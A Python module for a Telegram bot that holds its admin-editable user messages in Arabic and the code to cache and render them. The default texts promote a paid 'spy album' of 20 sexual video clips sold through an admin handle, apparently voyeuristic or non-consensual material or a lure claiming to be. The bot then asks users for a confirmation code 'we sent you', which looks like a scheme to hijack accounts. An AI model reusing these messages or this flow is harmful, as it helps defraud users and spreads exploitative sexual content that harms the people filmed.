# user_messages.py — نصوص تظهر للمستخدمين (قابلة للتعديل من أدمن A1)
import logging

import database
from config import REGISTRATION_LINK

logger = logging.getLogger(__name__)

DEFAULT_ALREADY_REGISTERED = (
    "✅ أنت مسجل مسبقاً!\n\n"
    "🔗 رابط الفيديو🫦🫦:\n{link}\n"
    "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💋🫦\n"
    "@N01_n0one"
)

DEFAULT_REGISTRATION_SUCCESS = (
    "✅ تم التسجيل بنجاح!\n\n"
    "🔗 رابط الفيديو🫦💋:\n{link}\n"
    "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💗💞\n"
    "@N01_n0one"
)

DEFAULT_START_MSG = "💋 للوصول إلى البوت، يجب عليك تأكيد أن عمرك يزيد عن 18 عامًا!🔞"
DEFAULT_CONFIRM_BUTTON = "عمري أكثر من 18 عامًا! ✔️"
DEFAULT_ENTER_CODE_MSG = (
    "✅ أدخل رمز التأكيد الذي أرسلناه إليك.\n\n"
    'يمكنك الحصول على الرمز من <a href="https://t.me/+42777">هنا</a>'
)
DEFAULT_CONFIRM_AGE_MSG = "💦 اضغط الزر! ❤️‍🔥\n👇👇 (عمري فوق ١٨ عامًا!) 👇👇"

DEFAULTS = {
    "already_registered": DEFAULT_ALREADY_REGISTERED,
    "registration_success": DEFAULT_REGISTRATION_SUCCESS,
    "registration_link": REGISTRATION_LINK,
    "start_msg": DEFAULT_START_MSG,
    "confirm_button": DEFAULT_CONFIRM_BUTTON,
    "enter_code_msg": DEFAULT_ENTER_CODE_MSG,
    "confirm_age_msg": DEFAULT_CONFIRM_AGE_MSG,
}

LABELS = {
    "already_registered": "مسجل مسبقاً (/start)",
    "registration_success": "بعد التسجيل بنجاح",
    "registration_link": "رابط الفيديو ({link})",
    "start_msg": "رسالة البداية (/start)",
    "confirm_button": "نص زر التأكيد",
    "enter_code_msg": "رسالة طلب الكود",
    "confirm_age_msg": "رسالة التحذير (بعد الضغط)",
}

_CACHE = {}


async def initialize_from_db() -> None:
    """تحميل الرسائل من قاعدة البيانات إلى الذاكرة عند بدء التشغيل."""
    global _CACHE
    try:
        settings = await database.get_all_settings()
        # نأخذ فقط الإعدادات التي تبدأ بـ um_
        _CACHE = {
            k[3:]: v for k, v in settings.items() if k.startswith("um_")
        }
        logger.info("user_messages initialized from db (%d messages)", len(_CACHE))
    except Exception as e:
        logger.error("user_messages init error: %s", e)


def render(key: str) -> str:
    """نص جاهز للإرسال للمستخدم."""
    # نستخدم الكاش (الذي تم تحميله من DB) أو الافتراضي
    if key == "registration_link":
        return get_link()
    template = _CACHE.get(key) or DEFAULTS.get(key, "")
    return template.replace("{link}", get_link())


def get_link() -> str:
    stored = (_CACHE.get("registration_link") or "").strip()
    return stored or REGISTRATION_LINK


def get_template(key: str) -> str:
    if key == "registration_link":
        return get_link()
    return _CACHE.get(key) or DEFAULTS.get(key, "")


async def set_message(key: str, text: str) -> None:
    if key not in DEFAULTS:
        raise ValueError(f"unknown message key: {key}")
    text = text.strip()
    _CACHE[key] = text
    await database.set_setting(f"um_{key}", text)


async def reset_message(key: str) -> None:
    if key not in DEFAULTS:
        raise ValueError(f"unknown message key: {key}")
    _CACHE.pop(key, None)
    await database.delete_setting(f"um_{key}")


async def reset_all() -> None:
    global _CACHE
    _CACHE = {}
    all_settings = await database.get_all_settings()
    for k in all_settings:
        if k.startswith("um_"):
            await database.delete_setting(k)
